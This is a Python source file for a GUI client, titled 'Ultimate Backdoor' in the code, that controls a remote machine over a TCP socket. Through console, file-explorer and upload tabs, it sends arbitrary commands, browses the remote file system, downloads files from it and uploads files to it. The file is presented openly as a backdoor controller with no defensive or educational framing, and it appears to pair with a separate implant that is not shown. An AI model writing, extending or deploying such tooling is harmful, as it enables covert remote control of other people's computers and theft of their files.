import customtkinter as ctk
import tkinter as tk
from tkinter import messagebox
import socket
from os.path import exists
from os import listdir
from pathlib import Path
import json

# Make sure they exist if not create them
if not exists("IpPortAddr.txt"):
    with open("IpPortAddr.txt", "x") as f:
        f.write("localhost\n8080")


# Create the main application
class InterfaceApp(ctk.CTk):
    def __init__(self):
        super().__init__()

        self.title("Ultimate Backdoor")
        self.geometry("1100x580")  # Set the dimensions of the window

        self.grid_columnconfigure(0, weight=1)
        self.grid_rowconfigure(0, weight=1)

        self.Bytes = 4096
        self.file_buttons = []

        # Create tabs
        self.tab_control = ctk.CTkTabview(self)
        self.tab_control.grid(
            row=0,
            column=0,
            columnspan=2,
            padx=10,
            pady=10,
            sticky="nsew",
        )

        # Create Console Tab
        self.console_tab = self.tab_control.add("Console")
        self.console_text = ctk.CTkTextbox(self.console_tab, wrap="word", height=15)
        self.console_text.pack(expand=True, fill="both")
        self.console_text.configure(state="disabled")

        self.cmd_entry = ctk.CTkEntry(self.console_tab, placeholder_text="Send")
        self.cmd_entry.pack(side="left", expand=True, fill="x")
        self.cmd_entry.bind(
            "<Return>", lambda event: self.send_button.invoke()
        )  # Bind Enter key press

        self.send_button = ctk.CTkButton(
            self.console_tab, text="Send!", command=self.send_command
        )
        self.send_button.pack(side="left")

        # Create File Explorer Tab
        self.file_explorer_tab = self.tab_control.add("File Explorer")
        self.update_button = ctk.CTkButton(
            self.file_explorer_tab, text="Update Tab", command=self.UpdateFileExplorer
        )
        self.send_button.pack(side="left")

        self.directory_entry = ctk.CTkEntry(
            self.file_explorer_tab, placeholder_text="..\\"
        )
        self.directory_entry.pack(fill="x", padx=10, pady=10)  # Use pack with fill="x"
        self.directory_entry.bind(
            "<Return>",
            lambda event: self.UpdateFileExplorer(),
        )  # Bind Enter key press

        # Create Button Frame tab content
        self.button_frame = ctk.CTkScrollableFrame(self.file_explorer_tab)
        self.button_frame.pack(
            fill="both", expand=True, padx=10, pady=10
        )  # Use pack with fill="both"

        self.upload_creator_tab = self.tab_control.add("Upload")
        self.upload_text = ctk.CTkTextbox(
            self.upload_creator_tab, wrap="word", height=15
        )
        self.upload_text.pack(expand=True, fill="both")

        self.upload_entry = ctk.CTkEntry(
            self.upload_creator_tab, placeholder_text="Name"
        )
        self.upload_entry.pack(side="left", expand=True, fill="x")
        self.upload_entry.bind(
            "<Return>", lambda event: self.upload_button.invoke()
        )  # Bind Enter key press

        self.upload_button = ctk.CTkButton(
            self.upload_creator_tab, text="Upload!", command=self.SendUpload
        )
        self.upload_button.pack(side="left")

        # Create IP Address and Port Number entries
        self.ip_entry = ctk.CTkEntry(self, placeholder_text="IP Address")
        self.ip_entry.grid(row=1, column=0, padx=10, pady=10, sticky="ew")

        self.port_entry = ctk.CTkEntry(self, placeholder_text="Port #")
        self.port_entry.grid(row=1, column=1, padx=10, pady=10, sticky="ew")

        # Saving And Loading IP and Ports
        savedIPPort = open("IpPortAddr.txt", "r").read().splitlines()
        # print(savedIPPort)

        self.ip_entry.delete(0, len(self.ip_entry.get()))
        self.ip_entry.insert(0, savedIPPort[0])

        self.port_entry.delete(0, len(self.ip_entry.get()))
        self.port_entry.insert(0, savedIPPort[1])

        # Saving Everything And ARE YOU SURE Request
        self.protocol("WM_DELETE_WINDOW", self.OnClosed)

        socket.setdefaulttimeout(3)
        try:
            self.UpdateFileExplorer()
        except:
            pass

    def OnClosed(self):
        with open("IpPortAddr.txt", "w") as f:
            f.write(self.ip_entry.get() + "\n" + self.port_entry.get())

        if messagebox.askokcancel("Quit", "Do you want to quit?"):
            self.destroy()

    def send_command(self):
        clearing = False
        connection = None
        try:
            self.console_text.configure(state="normal")
            command = self.cmd_entry.get()

            if command == "":
                response = "NULL"
            elif command == "cls" or command == "clear":
                response = ""
                clearing = True
            else:
                connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                connection.connect((self.ip_entry.get(), int(self.port_entry.get())))
                connection.send(command.encode())

                if "upload" in command:
                    Name = command.replace("upload", "").split(" ")[1]
                    if exists(Name):
                        Contents = open(Name, "r").read()
                    else:
                        Contents = command.replace("upload", "").split(" ", 2)[2]
                    command = "upload " + Name + " " + Contents
                elif "set bytes" in command:
                    self.Bytes = int(command.replace("set bytes ", ""))
                elif "set timeout" in command:
                    socket.setdefaulttimeout(float(command.replace("set timeout ", "")))

                response = connection.recv(self.Bytes).decode()
        except Exception as e:
            response = str(e)

        if not clearing:
            if "file: " in response:
                response = response.replace("file: ", "").split(" : ", 1)
                # print(response)
                with open(response[0], "w") as file:
                    file.write(response[1])
                response = response[0] + " Has been downloaded."
            elif command == "selfdir":
                response = "\n".join(listdir())

            self.console_text.insert("0.0", f"> {command}\n{response}\n")
        else:
            self.console_text.delete("0.0", "end")
        self.cmd_entry.delete(0, len(command))
        self.console_text.configure(state="disabled")
        if connection:
            connection.close()

    def RawCommand(self, command):
        if command != "":
            connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            connection.connect((self.ip_entry.get(), int(self.port_entry.get())))
            connection.send(command.encode())
            response = connection.recv(self.Bytes).decode()
            connection.close()
        else:
            response = "NULL"
        return response

    def SendUpload(self):
        Name = self.upload_entry.get()
        Contents = self.upload_text.get("0.0", tk.END)
        self.RawCommand("upload " + Name + " " + Contents)

    def UpdateFileExplorer(self):
        dirEntryText = self.directory_entry.get()
        isFile = Path(dirEntryText).suffix

        if isFile:
            file = self.RawCommand("download " + dirEntryText)
            with open(dirEntryText, "w") as f:
                f.write(file.replace("file: ", "", 1).split(" : ", 1)[1])
        else:
            self.RawCommand("cd " + dirEntryText)
            directoryList = self.RawCommand("dir").splitlines()
            self.button_frame.pack(fill="both", expand=True, padx=10, pady=10)

            for i in range(0, len(self.file_buttons)):
                self.file_buttons[0].destroy()
                self.file_buttons.pop(0)

            for i in directoryList:
                self.add_file_button(i)
            self.add_file_button("..\\")

        self.button_frame._parent_canvas.yview_moveto(0.0)
        # self.directory_entry.delete(0, len(dirEntryText))

    def FileButtonPress(self, Name):
        self.directory_entry.delete(0, len(self.directory_entry.get()))
        self.directory_entry.insert(0, Name)
        self.UpdateFileExplorer()

    def add_file_button(self, Name):
        new_button = ctk.CTkButton(
            self.button_frame,
            text=Name,
            width=100,
            command=lambda: self.FileButtonPress(Name),
        )
        new_button.pack(padx=5, pady=5, fill="x")
        self.file_buttons.append(new_button)


if __name__ == "__main__":
    app = InterfaceApp()
    app.mainloop()
